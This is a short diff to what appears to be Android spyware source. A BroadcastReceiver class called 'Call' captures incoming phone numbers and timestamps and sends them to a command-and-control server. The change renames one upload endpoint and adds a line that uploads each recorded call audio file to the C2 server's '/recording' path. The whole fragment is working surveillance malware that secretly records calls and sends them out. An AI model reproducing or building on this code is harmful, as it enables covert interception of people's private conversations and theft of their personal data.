@@ -44,7 +44,7 @@ public class Call extends BroadcastReceiver {
                     formData += "&number=" + incomingNumber;
                     formData += "&timestamp=" + System.currentTimeMillis();
 
-                    new NotifyC2(Utils.C2_SERVER + "/uploadCall", formData, result -> {
+                    new NotifyC2(Utils.C2_SERVER + "/uploadLog", formData, result -> {
 
                     }).execute();
 
@@ -71,6 +71,8 @@ public class Call extends BroadcastReceiver {
                     recorder.reset();
                     recorder.release();
                     isRecording = false;
+
+                    FileManager.uploadFile(audiofile.getPath(), Utils.C2_SERVER + "/recording");
 
                     String formData = "id=" + Utils.clientID(context);
                     formData += "&type=client";
